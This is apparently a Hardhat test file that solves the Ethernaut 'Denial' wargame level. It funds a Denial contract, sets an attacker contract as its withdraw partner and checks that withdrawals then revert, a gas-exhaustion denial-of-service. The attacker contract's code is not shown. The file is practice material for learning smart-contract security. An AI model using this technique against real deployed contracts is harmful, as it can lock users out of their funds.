import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Denial} from '../../types/typechain';

describe('Ethernaut 20: Denial', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Denial;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Denial', owner).then(f => f.deploy());
    await contract.deployed();

    // owner sends some funds
    await owner.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseEther('0.0001'),
    });
  });

  it('should make a DoS attack to the server', async () => {
    // deploy attacker boi
    const attackerContract = await ethers.getContractFactory('DenialAttacker', attacker).then(f => f.deploy());
    await attackerContract.deployed();

    // posion the contract
    await contract.setWithdrawPartner(attackerContract.address);
  });

  after(async () => {
    // for the test, we need to put some gas limit
    await expect(contract.withdraw({gasLimit: 1000000})).to.be.reverted;
  });
});
